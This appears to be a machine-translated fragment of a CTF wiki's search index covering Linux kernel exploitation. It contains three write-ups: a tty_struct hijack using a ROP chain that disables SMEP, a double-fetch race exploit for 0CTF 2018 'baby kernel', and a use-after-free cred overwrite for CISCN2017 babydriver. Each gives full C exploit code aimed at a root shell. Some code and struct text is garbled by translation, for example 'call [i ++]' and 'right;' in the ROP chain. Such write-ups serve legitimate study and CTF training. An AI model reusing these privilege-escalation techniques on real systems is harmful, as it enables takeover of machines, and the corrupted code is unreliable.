(*install)(struct tty_driver *driver, struct tty_struct *tty);\n\n    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);\n\n    int  (*open)(struct tty_struct * tty, struct file * filp);\n\n    void (*close)(struct tty_struct * tty, struct file * filp);\n\n    void (*shutdown)(struct tty_struct *tty);\n\n    void (*cleanup)(struct tty_struct *tty);\n\n    int  (*write)(struct tty_struct * tty,\n\n              const unsigned char *buf, int count);\n\n    int  (*put_char)(struct tty_struct *tty, unsigned char ch);\n\n    void (*flush_chars)(struct tty_struct *tty);\n\n    int  (*write_room)(struct tty_struct *tty);\n\n    int  (*chars_in_buffer)(struct tty_struct *tty);\n\n    int  (*ioctl)(struct tty_struct *tty,\n\n            unsigned int cmd, unsigned long arg);\n\n    long (*compat_ioctl)(struct tty_struct *tty,\n\n                 unsigned int cmd, unsigned long arg);\n\n    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);\n\n    void (*throttle)(struct tty_struct * tty);\n\n    void (*unthrottle)(struct tty_struct * tty);\n\n    void (*stop)(struct tty_struct *tty);\n\n    void (*start)(struct tty_struct *tty);\n\n    void (*hangup)(struct tty_struct *tty);\n    int (*break_ctl)(struct tty_struct *tty, int state);\n\n    void (*flush_buffer)(struct tty_struct *tty);\n\n    void (*set_ldisc)(struct tty_struct *tty);\n\n    void (*wait_until_sent)(struct tty_struct *tty, int timeout);\n\n    void (*send_xchar)(struct tty_struct *tty, char ch);\n\n    int (*tiocmget)(struct tty_struct *tty);\n\n    int (*tiocmset)(struct tty_struct *tty,\n\n            unsigned int set, unsigned int clear);\n\n    int (*resize)(struct tty_struct *tty, struct winsize *ws);\n\n    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);\n\n    int (*get_icount)(struct tty_struct *tty,\n\n                struct serial_icounter_struct *icount);\n\n    void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);\n\n#ifdef CONFIG_CONSOLE_POLL\n\n    int (*poll_init)(struct tty_driver *driver, int line, char *options);\n\n    int (*poll_get_char)(struct tty_driver *driver, int line);\n\n    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);\n\n#endif\n    int (*proc_show)(struct seq_file *, void *);\n\n} __randomize_layout;\n</code></pre></p> <p>A lot of function pointers (pwn hand feng shui treasure), so I imagine constructing the structure shown in the figure below <pre><code>fake_tty_struct  fake_tty_operations\n\n+---------+      +----------+\n\n|magic    |  +--&gt;|evil 1    |\n\n+---------+  |   +----------+\n\n|......   |  |   |evil 2    |\n\n|......   |  |   +----------+\n\n+---------+  |   |evil 3    |\n\n|*ops     |--+   +----------+\n\n+---------+      |evil 4    |\n\n|......   |      +----------+\n\n|......   |      |......    |\n\n+---------+      +----------+\n</code></pre></p> <p>Then we can jump to different evils through different operations (such as <code>write, ioctl</code>, etc.).</p> <p>For this topic, because smep protection is enabled, if you want ret2usr to increase the weight, you need to modify the value of cr4, and the control function pointer is not enough. You can control the function pointer to perform the stack pivot and other operations to our rop chain. Space, close smep with rop, and then proceed.</p> <p>&gt; This question is not given to vmlinux. You need to extract the kernel image using [extract-vmlinux] (https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux).</p> <p>After turning off smep protection, you can use rop to do whatever you want. The final exp is as follows: <pre><code>#include &lt;stdio.h&gt;\n\n#include &lt;stdlib.h&gt;\n\n#include &lt;unistd.h&gt;\n\n#include &lt;string.h&gt;\n\n#include &lt;sys/types.h&gt;\n\n#include &lt;sys/stat.h&gt;\n\n#include &lt;fcntl.h&gt;\n\n\n\n#define prepare_kernel_cred_addr 0xffffffff810a1810\n\n#define commit_creds_addr 0xffffffff810a1420\n\n\n\nvoid* fake_tty_operations[30];\n\n\n\nsize_t user_cs, user_ss, user_rflags, user_sp;\n\nvoid save_status()\n\n{\n\n    __asm__(\"mov user_cs, cs;\"\n\n            \"mov user_ss, ss;\"\n\n            \"mov user_sp, rsp;\"\n\n&amp;quot;pushf;&amp;quot;\n            \"pop user_rflags;\"\n\n            );\n\n    puts(\"[*]status has been saved.\");\n\n}\n\n\n\n\n\nvoid get_shell()\n\n{\n\n    system(\"/bin/sh\");\n\n}\n\n\n\nvoid get_root()\n\n{\n\n    char* (*pkc)(int) = prepare_kernel_cred_addr;\n\n    void (*cc)(char*) = commit_creds_addr;\n\n(* cc) ((* pkc) (0));\n}\n\nint main()\n\n{\n\n    save_status();\n\n\n\n    int i = 0;\n\n    size_t rop[32] = {0};\n\ncall [i ++] = 0xffffffff810d238d; // pop rdi; right;\ncall [i ++] = 0x6f0;\ncall [i ++] = 0xffffffff81004d80; // mov cr4, rdi; pop rbp; right;\ncall [i ++] = 0;\n    rop[i++] = (size_t)get_root;\n\ncall [i ++] = 0xffffffff81063694; // swapgs; pop rbp; right;\ncall [i ++] = 0;\ncall [i ++] = 0xffffffff814e35ef; // iretq; right;\n    rop[i++] = (size_t)get_shell;\n\n    rop[i++] = user_cs;                /* saved CS */\n\n    rop[i++] = user_rflags;            /* saved EFLAGS */\n\n    rop[i++] = user_sp;\n\n    rop[i++] = user_ss;\n\n\n\n    for(int i = 0; i &lt; 30; i++)\n\n    {\n\n        fake_tty_operations[i] = 0xFFFFFFFF8181BFC5; \n\n    }\n\n    fake_tty_operations[0] = 0xffffffff810635f5;  //pop rax; pop rbp; ret;\n\n    fake_tty_operations[1] = (size_t)rop;\n\n    fake_tty_operations[3] = 0xFFFFFFFF8181BFC5;  // mov rsp,rax ; dec ebx ; ret\n\n\n\n    int fd1 = open(\"/dev/babydev\", O_RDWR);\n\n    int fd2 = open(\"/dev/babydev\", O_RDWR);\n\n    ioctl(fd1, 0x10001, 0x2e0);\n\n    close(fd1);\n\n\n\n    int fd_tty = open(\"/dev/ptmx\", O_RDWR|O_NOCTTY);\n\n    size_t fake_tty_struct[4] = {0};\n\n    read(fd2, fake_tty_struct, 32);\n\n    fake_tty_struct[3] = (size_t)fake_tty_operations;\n\n    write(fd2,fake_tty_struct, 32);\n\n\n\n    char buf[0x8] = {0};\n\n    write(fd_tty, buf, 8);\n\n\n\n    return 0;\n\n}\n</code></pre></p>"},{"location":"pwn/linux/kernel/double-fetch/","title":"Double Fetch","text":""},{"location":"pwn/linux/kernel/double-fetch/#overview","title":"Overview","text":"<p><code>Double Fetch</code> is a conditional competition vulnerability in principle. It is a data access competition between kernel mode and user mode.</p> <p>In modern operating systems such as Linux, virtual memory addresses are usually divided into kernel space and user space. The kernel space is responsible for running kernel code, driver module code, etc., with higher permissions. The user space runs the user code and enters the kernel through system calls to complete the relevant functions. Normally, when user space passes data to the kernel, the kernel first copies the user data to the kernel space through the copy function such as <code>copy_from_user</code> for verification and related processing. However, when the input data is more complicated, the kernel may only refer to its pointer. And temporarily save the data in the user space for subsequent processing. At this time, the data is falsified by other malicious threads, causing the kernel verification data to be inconsistent with the actual usage data, resulting in abnormal execution of the kernel code.</p> <p>A typical <code>Double Fetch</code> vulnerability principle is shown in the following figure. A user-mode thread prepares data and enters the kernel through a system call. The data is fetched twice in the kernel, and the kernel first fetches data for security check ( Such as buffer size, pointer availability, etc., when the check passes, the kernel takes the second data for actual processing. Between the two fetched data, another user-mode thread can create conditional competition, tampering with the user-mode data that has passed the check, causing the access to be out of bounds or buffer overflow during real use, eventually leading to kernel crash or privilege escalation. .</p> <p>[Typical Double Fetch Schematic] (./double-fetch.png)</p>"},{"location":"pwn/linux/kernel/double-fetch/#2018-0ctf-finals-baby-kernel","title":"2018 0CTF Finals Baby Kernel","text":""},{"location":"pwn/linux/kernel/double-fetch/#problem-analysis","title":"Problem Analysis","text":"<p>First, the driver file is analyzed by IDA. It can be seen that the flag is hard coded in the driver file.</p> <pre><code>.data: 0000000000000480 flag dq offset aFlagThisWillBe\n.data:0000000000000480                                         ; DATA XREF: baby_ioctl+2A\u2191r\n\n.data:0000000000000480                                         ; baby_ioctl+DB\u2191r ...\n\n.data:0000000000000480                                         ; \"flag{THIS_WILL_BE_YOUR_FLAG_1234}\"\n\n.data:0000000000000488                 align 20h\n</code></pre> <p>The driver primarily registers a <code>baby_ioctl</code> function with two functions. When the cmd parameter in ioctl is 0x6666, the driver will output the load address of the flag. When the cmd parameter in ioctl is 0x1337, three checksums are first performed, and then the content input by the user is compared with the hard-coded flag byte by byte. When it is consistent, the flag is output by <code>printk</code>.</p> <pre><code>signed __int64 __fastcall baby_ioctl(__int64 a1, attr *a2)\n\n{\n\n  attr *v2; // rdx\n\n  signed __int64 result; // rax\n\n  int i; // [rsp-5Ch] [rbp-5Ch]\n\n  attr *v5; // [rsp-58h] [rbp-58h]\n\n\n\n  _fentry__(a1, a2);\n\nv5 = v2;\n  if ( (_DWORD)a2 == 0x6666 )\n\n  {\n\n    printk(\"Your flag is at %px! But I don't think you know it's content\\n\", flag);\n\n    result = 0LL;\n\n  }\n\n  else if ( (_DWORD)a2 == 0x1337\n\n         &amp;&amp; !_chk_range_not_ok((__int64)v2, 16LL, *(_QWORD *)(__readgsqword((unsigned __int64)&amp;current_task) + 4952))\n\n         &amp;&amp; !_chk_range_not_ok(\n\n               v5-&gt;flag_str,\n\nSLODWORD (N 5&amp;gt; flag_len)\n               *(_QWORD *)(__readgsqword((unsigned __int64)&amp;current_task) + 4952))\n\n         &amp;&amp; LODWORD(v5-&gt;flag_len) == strlen(flag) )\n\n  {\n\n    for ( i = 0; i &lt; strlen(flag); ++i )\n\n    {\n\n      if ( *(_BYTE *)(v5-&gt;flag_str + i) != flag[i] )\n\n        return 0x16LL;\n\n    }\n\n    printk(\"Looks like the flag is not a secret anymore. So here is it %s\\n\", flag);\n\n    result = 0LL;\n\n  }\n\n  else\n\n  {\n\n    result = 0xELL;\n\n  }\n\n  return result;\n\n}\n</code></pre> <p>And analyze its check function, where <code>_chk_range_not_ok</code> is to check if the pointer and length range point to user space. Through the analysis of the function of the driver file, the data structure input by the user can be obtained as follows:</p> <pre><code>00000000 attr            struc ; (sizeof=0x10, mappedto_3)\n\n00000000 flag_str dq?\n00000008 flag_len dq?\n00000010 attr            ends\n</code></pre> <p>The inspection content is:</p> <ol> <li>Whether the input data pointer is user mode data.</li> <li>Whether the flag_str in the data pointer points to the user mode.</li> <li>According to whether the flag_len in the pointer is equal to the length of the hardcoded flag.</li> </ol>"},{"location":"pwn/linux/kernel/double-fetch/#problem-solving","title":"Problem Solving","text":"<p>According to the principle of <code>Double Fetch</code> vulnerability, there is a <code>Double Fetch</code> vulnerability in this problem. When the user input data is verified, the address pointed to by <code>flag_str</code> is changed to the flag hard-coded address, and the flag content is output.</p> <p>First, use the provided <code>cmd=0x6666</code> function to get the load address of the flag in the kernel.</p> <p>&gt; The contents of the kernel output with <code>printk</code> can be viewed with the <code>dmesg</code> command.</p> <p>Then, construct a data structure that conforms to the <code>cmd=0x1337</code> function, where <code>flag_len</code> can be obtained directly from hardcoded as 33, and <code>flag_str</code> points to a user space address.</p> <p>Finally, a malicious thread is created, and the user-state address pointed to by <code>flag_str</code> is continually modified to the kernel address of the flag to create a race condition, so that it passes the byte-by-byte comparison check in the driver and outputs the flag content.</p>"},{"location":"pwn/linux/kernel/double-fetch/#exploit","title":"Exploit","text":"<pre><code>// gcc -static exp.c -lpthread -o exp\n\n#include &lt;string.h&gt;\n\nchar *strstr(const char *haystack, const char *needle);\n\n#define _GNU_SOURCE         /* See feature_test_macros(7) */\n\n#include &lt;string.h&gt;\n\nchar *strcasestr(const char *haystack, const char *needle);\n\n#include &lt;stdio.h&gt;\n\n#include &lt;stdlib.h&gt;\n\n#include &lt;unistd.h&gt;\n\n#include &lt;sys/types.h&gt;\n\n#include &lt;sys/stat.h&gt;\n\n#include &lt;sys/ioctl.h&gt;\n\n#include &lt;fcntl.h&gt;\n\n#include &lt;pthread.h&gt;\n\n\n\n#define TRYTIME 0x1000 //Number of collisions\n#define LEN 0x1000\n\n\nstruct attr\n\n{\n\n    char *flag;\n\n    size_t len;\n\n};\n\nunsigned long long addr;\n\nint finish =0;\n\nchar buf [LEN + 1] = {0};\n/ / Thread function, constantly modify the address pointed to by the flag is the flag address in the kernel\nvoid change_attr_value(void *s){\n\n    struct attr * s1 = s; \n\n    while(finish==0){\n\n    s1-&gt;flag = addr;\n    }\n\n}\n\n\n\nint main(void)\n\n{\n\n    int addr_fd;\n\n    char *idx;\n\n    int fd = open(\"/dev/baby\",0);\n\n    int ret = ioctl(fd,0x6666);    \n\n    pthread_t t1;\n\n    struct attr t;\n\n    setvbuf(stdin,0,2,0);\n\n    setvbuf(stdout,0,2,0);\n\n    setvbuf(stderr,0,2,0);   \n\n/ / Get the kernel hard-coded flag address\n    system(\"dmesg &gt; /tmp/record.txt\");\n\n    addr_fd = open(\"/tmp/record.txt\",O_RDONLY);\n\n    lseek(addr_fd,-LEN,SEEK_END);\n\n    read(addr_fd,buf,LEN);\n\n    close(addr_fd);\n\n    idx = strstr(buf,\"Your flag is at \");\n\n    if (idx == 0){\n\n        printf(\"[-]Not found addr\");\n\n        exit(-1);\n\n    }\n\n    else{\n\n        idx+=16;\n\n        addr = strtoull(idx,idx+16,16);\n\n        printf(\"[+]flag addr: %p\\n\",addr);\n\n    }\n\n/ / Construct attr data structure\nt.len = 33;\n    t.flag = buf;\n\n/ / New malicious thread\n    pthread_create(&amp;t1, NULL, change_attr_value,&amp;t);\n\n    for(int i=0;i&lt;TRYTIME;i++){\n\n        ret = ioctl(fd, 0x1337, &amp;t);\n\n        t.flag = buf;\n\n    }\n\n    finish = 1;\n\n    pthread_join(t1, NULL);\n\n    close(fd);\n\n    puts(\"[+]result is :\");\n\n    system(\"dmesg | grep flag\");\n\n    return 0;\n\n}\n</code></pre>"},{"location":"pwn/linux/kernel/double-fetch/#other","title":"Other","text":"<p>There are a few points to note when this topic is deployed in the environment.</p> <p>First, you need to turn off <code>dmesg_restrict</code>, otherwise you can't view the <code>printk</code> information. The specific operation is to add in the startup script:</p> <pre><code>echo 0 &gt; /proc/sys/kernel/dmesg_restrict\n</code></pre> <p>Second, do not enable <code>SMAP</code> protection when configuring QEMU startup parameters, otherwise direct access to user state data in the kernel will cause <code>kerne panic</code>.</p> <p>Also, when configuring the QEMU startup parameters, you need to configure non-single-core single-thread startup, otherwise the race condition in the title cannot be triggered. The specific operation is to increase the number of cores in the startup parameters, such as:</p> <pre><code>-smp 2, cores = 2, threads = 1 \\\n</code></pre> <p>&gt; After startup, you can check the number of currently running kernels and the number of hyperthreads by <code>/proc/cpuinfo</code>.</p> <p>Finally, there is an unintended solution to a side channel attack on this problem:</p> <p>&gt; Since flag is hard-coded, and the check method is byte-by-byte comparison, it can be blasted byte by byte to get the flag.</p> <p>&gt; The method is to place the byte to be blasted at the end of the memory page of the mmap application, at which point the next byte is in the user-space that is not readable or writable. When the correct one byte is obtained, the kernel compares the correctness of the next byte in the user space. Since the address is unreadable, it will cause <code>kernel panic</code>, so that it can be judged whether one byte of the burst is correct.</p>"},{"location":"pwn/linux/kernel/double-fetch/#reference","title":"Reference","text":"<p>https://www.usenix.org/conference/usenixsecurity17/technical-sessions/presentation/wang-pengfei</p> <p>https://veritas501.space/2018/06/04/0CTF%20final%20baby%20kernel/</p> <p>http://p4nda.top/2018/07/20/0ctf-baby/</p> <p>https://www.freebuf.com/articles/system/156485.html</p>"},{"location":"pwn/linux/kernel/environment/","title":"\u73af\u5883\u642d\u5efa","text":"<p>\u53c2\u89c1 ctf-tools</p>"},{"location":"pwn/linux/kernel/kernel_uaf/","title":"Kernel-UAF","text":""},{"location":"pwn/linux/kernel/kernel_uaf/#kernel-uaf","title":"kernel UAF","text":""},{"location":"pwn/linux/kernel/kernel_uaf/#ciscn2017-baby-driver","title":"CISCN2017 - baby driver","text":"<p>attachment here</p>"},{"location":"pwn/linux/kernel/kernel_uaf/#analysis","title":"Analysis","text":"<p>Unzip rootfs.cpio first and see what files are there. <pre><code>CISCN2017_babydriver [master\u25cf] mkdir core\n\nCISCN2017_babydriver [master\u25cf] cd core \n\ncore [master\u25cf] mv ../rootfs.cpio rootfs.cpio.gz\n\ncore [master\u25cf\u25cf] gunzip ./rootfs.cpio.gz \n\ncore [master \u25cf] ls\nrootfs.cpio\n\ncore [master\u25cf] cpio -idmv &lt; rootfs.cpio \n\n.\n\netc\n\netc/init.d\n\netc/passwd\n\netc/group\n\n...\n\n...\n\nusr/sbin/rdev\n\nusr/sbin/ether-wake\n\ntmp\n\nlinuxrc\n\nhome\n\nhome/ctf\n\n5556 blocks\ncore [master \u25cf] ls\nbin  etc  home  init  lib  linuxrc  proc  rootfs.cpio  sbin  sys  tmp  usr\n\ncore [master\u25cf] bat init\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n       \u2502 File: init\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n1 \u2502 #! / Bin / sh\n   2   \u2502\n\n   3   \u2502 mount -t proc none /proc\n\n   4   \u2502 mount -t sysfs none /sys\n\n   5   \u2502 mount -t devtmpfs devtmpfs /dev\n\n   6   \u2502 chown root:root flag\n\n   7   \u2502 chmod 400 flag\n\n   8   \u2502 exec 0&lt;/dev/console\n\n   9   \u2502 exec 1&gt;/dev/console\n\n  10   \u2502 exec 2&gt;/dev/console\n\n  11   \u2502\n\n  12   \u2502 insmod /lib/modules/4.4.72/babydriver.ko\n\n13 \u2502 chmod 777 / dev / babydev\n  14   \u2502 echo -e \"\\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\\n\"\n\n  15   \u2502 setsid cttyhack setuidgid 1000 sh\n\n  16   \u2502\n\n  17   \u2502 umount /proc\n\n  18   \u2502 umount /sys\n\n  19   \u2502 poweroff -d 0  -f\n\n  20   \u2502\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n</code></pre></p> <p>According to the content of init, the driver of <code>babydriver.ko</code> is loaded in 12 lines. According to the general routine of pwn, this is the vulnerable LKM. The other commands in init are common commands for linux and will not be explained.</p> <p>Take this driver file out.</p> <pre><code>core [master\u25cf] cp ./lib/modules/4.4.72/babydriver.ko ..\n\ncore [master \u25cf] cd ..\nCISCN2017_babydriver [master\u25cf] check ./babydriver.ko\n\n./babydriver.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=8ec63f63d3d3b4214950edacf9e65ad76e0e00e7, with debug_info, not stripped\n\n[*] '/home/m4x/pwn_repo/CISCN2017_babydriver/babydriver.ko'\n\n    Arch:     amd64-64-little\n\n    RELRO:    No RELRO\n\n    Stack:    No canary found\n\n    NX:       NX enabled\n\nFOOT: No FOOT (0x0)\n</code></pre> <p>No PIE, no canary protection, no symbol table removed, very nice.</p> <p>Open the analysis with IDA. Since the symbol table is not removed, shift + F9 first looks at what structure, you can find the following structure: <code>`</code>asm 00000000 babydevice_t    struc ; (sizeof=0x10, align=0x8, copyof_429)</p> <p>00000000                                         ; XREF: .bss:babydev_struct/r</p> <p>00000000 device_buf      dq ?                    ; XREF: babyrelease+6/r</p> <p>00000000                                         ; babyopen+26/w ... ; offset</p> <p>00000008 device_buf_len  dq ?                    ; XREF: babyopen+2D/w</p> <p>00000008; babyioctl + 3C / w ... 00000010 babydevice_t    ends</p> <p>00000010</p> <pre><code>Look at the main function\n\n\n**babyioctl:** Defines the 0x10001 command, you can release the device\\_buf in the global variable babydev\\_struct, and then reapply a block of memory according to the size passed by the user, and set device\\_buf\\_len.\n```C\n\n// local variable allocation has failed, the output may be wrong!\n\nvoid __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)\n\n{\n\n  size_t v3; // rdx\n\n  size_t v4; // rbx\n\n  __int64 v5; // rdx\n\n\n\n  _fentry__(filp, *(_QWORD *)&amp;command);\n\nv4 = v3;\n  if ( command == 0x10001 )\n\n  {\n\n    kfree(babydev_struct.device_buf);\n\n    babydev_struct.device_buf = (char *)_kmalloc(v4, 0x24000C0LL);\n\n    babydev_struct.device_buf_len = v4;\n\n    printk(\"alloc done\\n\", 0x24000C0LL, v5);\n\n  }\n\n  else\n\n  {\n\n    printk(\"\\x013defalut:arg is %ld\\n\", v3, v3);\n\n  }\n\n}\n</code></pre> <p>babyopen: Apply for a space of 0x40 bytes, the address is stored in the global variable babydev_struct.device_buf, and update babydev_struct.device_buf_len <pre><code>int __fastcall babyopen(inode *inode, file *filp)\n\n{\n\n  __int64 v2; // rdx\n\n\n\n  _fentry__(inode, filp);\n\n  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 0x40LL);\n\nbabydev_struct.device_buf_len = 64LL;\n  printk(\"device open\\n\", 0x24000C0LL, v2);\n\n  return 0;\n\n}\n</code></pre></p> <p>babyread: First check if the length is less than babydev_struct.device_buf_len, then copy the data in babydev_struct.device_buf to the buffer, the buffer and the length are the parameters passed by the user. <pre><code>void __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)\n\n{\n\n  size_t v4; // rdx\n\n\n\n  _fentry__(filp, buffer);\n\n  if ( babydev_struct.device_buf )\n\n  {\n\n    if ( babydev_struct.device_buf_len &gt; v4 )\n\n      copy_to_user(buffer, babydev_struct.device_buf, v4);\n\n  }\n\n}\n</code></pre></p> <p>babywrite: Similar to babyread, the difference is from the buffer copy to the global variable <pre><code>void __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)\n\n{\n\n  size_t v4; // rdx\n\n\n\n  _fentry__(filp, buffer);\n\n  if ( babydev_struct.device_buf )\n\n  {\n\n    if ( babydev_struct.device_buf_len &gt; v4 )\n\n      copy_from_user(babydev_struct.device_buf, buffer, v4);\n\n  }\n\n}\n</code></pre></p> <p>babyrelease: free up space, nothing to say <pre><code>int __fastcall babyrelease(inode *inode, file *filp)\n\n{\n\n  __int64 v2; // rdx\n\n\n\n  _fentry__(inode, filp);\n\n  kfree(babydev_struct.device_buf);\n\n  printk(\"device release\\n\", filp, v2);\n\n  return 0;\n\n}\n</code></pre></p> <p>There are also two functions, babydriver_init() and babydriver_exit(), which complete the initialization and cleanup of the /dev/babydev device respectively. Check the usage of the function and no longer analyze it.</p>"},{"location":"pwn/linux/kernel/kernel_uaf/#ideas","title":"Ideas","text":"<p>There are no vulnerabilities such as user-space traditional overflow, but there is a UAF vulnerability caused by pseudo-conditional competition.</p> <p>This means that if we open both devices at the same time, the second time will overwrite the first allocated space, because babydev_struct is global. Similarly, if the first one is released, then the second one is actually released, which results in a UAF.</p> <p>So how do you use UAF? As mentioned before, the cred structure can be modified to grant root to root.</p> <p>The 4.7.22 cred structure [definition] (https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/cred.h#L118) is as follows: <pre><code>struct cred {\n    atomic_t    usage;\n\n#ifdef CONFIG_DEBUG_CREDENTIALS\n\n    atomic_t    subscribers;    /* number of processes subscribed */\n\n    void        *put_addr;\n\n    unsigned    magic;\n\n#define CRED_MAGIC  0x43736564\n\n#define CRED_MAGIC_DEAD 0x44656144\n\n#endif\n    kuid_t      uid;        /* real UID of the task */\n\n    kgid_t      gid;        /* real GID of the task */\n\n    kuid_t      suid;       /* saved UID of the task */\n\n    kgid_t      sgid;       /* saved GID of the task */\n\n    kuid_t      euid;       /* effective UID of the task */\n\n    kgid_t      egid;       /* effective GID of the task */\n\nbut_t fsuid; / * UID for VFS ops * /\n    kgid_t      fsgid;      /* GID for VFS ops */\n\n    unsigned    securebits; /* SUID-less security management */\n\n    kernel_cap_t    cap_inheritable; /* caps our children can inherit */\n\n    kernel_cap_t    cap_permitted;  /* caps we're permitted */\n\n    kernel_cap_t    cap_effective;  /* caps we can actually use */\n\n    kernel_cap_t    cap_bset;   /* capability bounding set */\n\n    kernel_cap_t    cap_ambient;    /* Ambient capability set */\n\n#ifdef CONFIG_KEYS\n\n    unsigned char   jit_keyring;    /* default keyring to attach requested\n\n                     * keys to */\n\n    struct key __rcu *session_keyring; /* keyring inherited over fork */\n\n    struct key  *process_keyring; /* keyring private to this process */\n\n    struct key  *thread_keyring; /* keyring private to this thread */\n\n    struct key  *request_key_auth; /* assumed request_key authority */\n\n#endif\n#ifdef CONFIG_SECURITY\n\n    void        *security;  /* subjective LSM security */\n\n#endif\n    struct user_struct *user;   /* real user ID subscription */\n\n    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */\n\n    struct group_info *group_info;  /* supplementary groups for euid/fsgid */\n\n    struct rcu_head rcu;        /* RCU deletion hook */\n\n};\n</code></pre></p> <p>Then according to the UAF's thinking, the idea is as follows:</p> <ol> <li>Turn on the device twice and change its size to the size of the cred structure via ioctl</li> <li>Release one, fork a new process, then the space of the cred of this new process will overlap with the previously released space</li> <li>At the same time, we can write to this space through another file descriptor, just need to change uid, gid to 0, that is, you can achieve the right to root</li> </ol> <p>Need to determine the size of the cred structure, with the source code, the size is well defined. The calculation is 0xa8 (note the source code using the same kernel version).</p>"},{"location":"pwn/linux/kernel/kernel_uaf/#exploit","title":"Exploit","text":"<p>The comments are written in the code, exploit here <pre><code>CISCN2017_babydriver [master\u25cf\u25cf] cat exploit.c \n\n#include &lt;stdio.h&gt;\n\n#include &lt;stdlib.h&gt;\n\n#include &lt;unistd.h&gt;\n\n#include &lt;fcntl.h&gt;\n\n#include &lt;stropts.h&gt;\n\n#include &lt;sys/wait.h&gt;\n\n#include &lt;sys/stat.h&gt;\n\n\n\nint main()\n\n{\n\n// Open the device twice\n    int fd1 = open(\"/dev/babydev\", 2);\n\n    int fd2 = open(\"/dev/babydev\", 2);\n\n\n\n// Modify babydev_struct.device_buf_len to sizeof(struct cred)\n    ioctl(fd1, 0x10001, 0xa8);\n\n\n// release fd1\n    close(fd1);\n\n\n\n// The cred space of the new process will overlap with the babydev_struct just released\n    int pid = fork();\n\n    if(pid &lt; 0)\n\n    {\n\n        puts(\"[*] fork error!\");\n\n        exit(0);\n\n    }\n\n\n\n    else if(pid == 0)\n\n    {\n\n// Modify the uid of the cred of the new process by changing fd2, the value of gid is 0.\n        char zeros[30] = {0};\n\n        write(fd2, zeros, 28);\n\n\n\n        if(getuid() == 0)\n\n        {\n\n            puts(\"[+] root now.\");\n\n            system(\"/bin/sh\");\n\n            exit(0);\n\n        }\n\n    }\n\n\n\n    else\n\n    {\n\n        wait(NULL);\n\n    }\n\n    close(fd2);\n\n\n\n    return 0;\n\n}\n</code></pre></p>"},{"location":"pwn/linux/kernel/kernel_uaf/#get-root-shell","title":"get root shell","text":"<pre><code>// statically compile the file, there is no libc in the kernel\nCISCN2017_babydriver [master\u25cf\u25cf] gcc exploit.c -static -o exploit\n\nCISCN2017_babydriver [master\u25cf\u25cf] file exploit\n\nexploit: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=90aabed5497b6922fda3d5118e4aa9cb2fa5ccc5, not stripped\n\n// Repackage rootfs.cpio in the directory where the compiled exp is extracted.\nCISCN2017_babydriver [master\u25cf\u25cf] cp exploit core/tmp \n\nCISCN2017_babydriver [master\u25cf\u25cf] cd core \n\ncore [master\u25cf\u25cf] find . | cpio -o --format=newc &gt; rootfs.cpio\n\n7017 block\ncore [master\u25cf\u25cf] cp rootfs.cpio ..\n\ncore [master \u25cf\u25cf] cd ..\n// kvm requires root privileges\nCISCN2017_babydriver [master\u25cf\u25cf] sudo ./boot.sh\n\n......\n\n......\n\n\n\n/ $ ls / tmp /\nexploit\n\n/ $ id\n\nuid=1000(ctf) gid=1000(ctf) groups=1000(ctf)\n\n/ $ /tmp/exploit\n\n[   14.376187] device open\n\n[   14.376715] device open\n\n[   14.377201] alloc done\n\n[   14.377629] device release\n\n[+] root now.\n\n/ # id\n\nuid=0(root) gid=0(root) groups=1000(ctf)\n\n/ #\n</code></pre> <p>Of course, you can also use rop to do the next analysis.</p>"},{"location":"pwn/linux/kernel/kernel_uaf/#reference","title":"Reference:","text":"<p>https://bbs.pediy.com/thread-247054.htm</p> <p>https://whereisk0shl.top/NCSTISC%20Linux%20Kernel%20pwn450%20writeup.html</p> <p>http://muhe.live/2017/07/13/babydriver-writeup/</p> 